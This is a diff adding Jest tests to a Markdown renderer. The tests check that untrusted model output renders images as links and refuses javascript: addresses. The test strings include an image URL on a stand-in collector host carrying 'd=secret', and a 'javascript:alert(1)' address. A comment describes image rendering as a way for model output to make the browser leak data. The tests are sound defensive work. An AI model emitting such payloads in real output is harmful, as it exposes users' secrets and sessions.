@@ -56,3 +56,40 @@ describe('untrusted model output cannot become script', () => {
     expect(container.querySelector('a')?.getAttribute('href')).toBe('https://example.org/x');
   });
 });
+
+// Not script, but the same text: an <img> is fetched the moment it renders, so
+// an image in model output made the viewer's browser call any address the text
+// named, with the session cookie when that address was this origin.
+describe('untrusted model output cannot make the browser fetch', () => {
+  it('offers an image as a link instead of loading it', () => {
+    const { container } = render(
+      <Markdown text={'![build log](https://collector.example/p.png?d=secret)'} />,
+    );
+
+    expect(container.querySelectorAll('img')).toHaveLength(0);
+    const link = container.querySelector('a');
+    expect(link?.getAttribute('href')).toBe('https://collector.example/p.png?d=secret');
+    expect(link?.textContent).toBe('build log');
+  });
+
+  it('keeps an image inside a link as that link’s text, without nesting links', () => {
+    const { container } = render(
+      <Markdown
+        text={'[![build passing](https://ci.example/badge.svg)](https://ci.example/run)'}
+      />,
+    );
+
+    expect(container.querySelectorAll('img')).toHaveLength(0);
+    const links = container.querySelectorAll('a');
+    expect(links).toHaveLength(1);
+    expect(links[0].getAttribute('href')).toBe('https://ci.example/run');
+    expect(links[0].textContent).toBe('build passing');
+  });
+
+  it('shows only the words of an image whose address was refused', () => {
+    const { container } = render(<Markdown text={'![diagram](javascript:alert(1))'} />);
+
+    expect(container.querySelectorAll('img, a')).toHaveLength(0);
+    expect(container.textContent).toBe('diagram');
+  });
+});
